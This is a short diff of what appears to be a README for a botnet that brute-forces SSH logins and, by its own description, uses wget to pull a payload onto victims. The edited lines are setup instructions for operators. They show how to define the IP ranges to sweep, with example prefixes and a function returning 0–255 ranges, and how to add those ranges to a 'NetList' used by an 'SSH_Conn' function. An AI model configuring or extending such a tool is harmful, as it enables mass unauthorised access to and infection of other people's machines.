@@ -33,14 +33,15 @@ and login by Brute-force attack. This botnet will use "wget" to get payload from
 		case var_name:
 				return ManageIP_range(ipRange, GenRange(255, 0))
 				
-(2.1) In case that ip range you don't want to config your second network prefix you can skip this section.
+(2.1) In case of The ip range That you don't want to custom your second network prefix.
 	
 	Example:
 	
 		var_anme = "224.12"
 		var_anme = "224.20"
 		
-	#The ip range that's look like this it will return range of The id since 0 - 255 by default.
+	#The ip range that look like this it will return range of The id since 0 - 255 by default.
+	#So... That's mean you don't need to add a case of your ip range.
 	
 
 (3) Then go to The "SSH_Conn" function, And add your ip constant to The slice name "NetList".
